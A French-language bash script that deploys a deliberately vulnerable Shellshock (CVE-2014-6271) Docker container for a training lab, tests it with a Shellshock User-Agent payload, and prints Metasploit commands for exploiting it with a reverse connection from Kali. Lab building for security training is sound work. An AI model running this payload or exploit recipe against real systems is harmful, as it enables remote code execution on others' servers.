#!/bin/bash
set -e

echo "================================================"
echo "  SHELLSHOCK (CVE-2014-6271)"
echo "  Bash Environment Variable RCE"
echo "================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Lance avec sudo"
    exit 1
fi

SERVER_IP=$(hostname -I | awk '{print $1}')

# ========================================
# NETTOYAGE COMPLET
# ========================================

echo "[1/4] Nettoyage total..."
docker stop tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln dvwa-vuln shellshock-vuln 2>/dev/null || true
docker rm tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln dvwa-vuln shellshock-vuln 2>/dev/null || true
echo "   ‚úÖ Nettoyage termin√©"

# ========================================
# INSTALLATION SHELLSHOCK
# ========================================

echo "[2/4] Installation Shellshock..."
docker pull vulnerables/cgi-bin

echo "[3/4] Lancement container (port 8080)..."
docker run -d \
    --name shellshock-vuln \
    --restart unless-stopped \
    -p 8080:80 \
    vulnerables/cgi-bin

echo "[4/4] V√©rification (10 secondes)..."
sleep 10

# V√©rifier que le container tourne
if ! docker ps | grep -q shellshock-vuln; then
    echo "‚ùå Container non actif"
    docker logs shellshock-vuln
    exit 1
fi

# V√©rifier l'acc√®s HTTP
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)

if [ "$HTTP_CODE" != "200" ]; then
    echo "‚ö†Ô∏è  HTTP $HTTP_CODE (peut √™tre normal)"
fi

# Test Shellshock manuel
TEST=$(curl -s -A "() { :; }; echo vulnerable" http://localhost:8080/cgi-bin/shock.cgi 2>/dev/null | grep -o vulnerable || echo "")

echo ""
echo "================================================"
echo "  ‚úÖ SHELLSHOCK INSTALL√â !"
echo "================================================"
echo ""
docker ps | grep shellshock
echo ""
echo "üìä Configuration:"
echo "   Vuln√©rabilit√©: Shellshock (CVE-2014-6271)"
echo "   Container: vulnerables/cgi-bin"
echo "   Port: 8080"
echo "   URL: http://${SERVER_IP}:8080/"
echo "   Script CGI: /cgi-bin/shock.cgi"

if [ -n "$TEST" ]; then
    echo "   Status: ‚úÖ VULN√âRABLE (test manuel OK)"
else
    echo "   Status: ‚ö†Ô∏è  √Ä v√©rifier avec Metasploit"
fi

echo ""
echo "================================================"
echo "  üî• EXPLOITATION METASPLOIT"
echo "================================================"
echo ""
echo "DEPUIS KALI:"
echo ""
echo "msfconsole -q"
echo "use exploit/multi/http/apache_mod_cgi_bash_env_exec"
echo "set RHOSTS ${SERVER_IP}"
echo "set RPORT 8080"
echo "set TARGETURI /cgi-bin/shock.cgi"
echo "set LHOST 192.168.100.10"
echo "set LPORT 4444"
echo "check"
echo "exploit"
echo ""
echo "ALTERNATIVE SI √âCHEC:"
echo "set TARGETURI /cgi-bin/test.cgi"
echo "exploit"
echo ""
echo "================================================"
echo "  üìñ SC√âNARIO LAB"
echo "================================================"
echo ""
echo "Iron4Software utilise des scripts CGI pour:"
echo "- Monitoring serveur mail (stats temps r√©el)"
echo "- Consultation logs Postfix/Dovecot"
echo "- Alertes syst√®me automatiques"
echo "- Interface web admin basique"
echo ""
echo "CVE-2014-6271 (Shellshock):"
echo "Bash vuln√©rable permet l'injection de code"
echo "via variables d'environnement HTTP (User-Agent,"
echo "Cookie, Referer, etc.)"
echo ""
echo "Impact: RCE avec privil√®ges du serveur web"
echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
echo ""
echo "================================================"
echo "  ‚úÖ PR√äT POUR EXPLOITATION"
echo "================================================"
echo ""
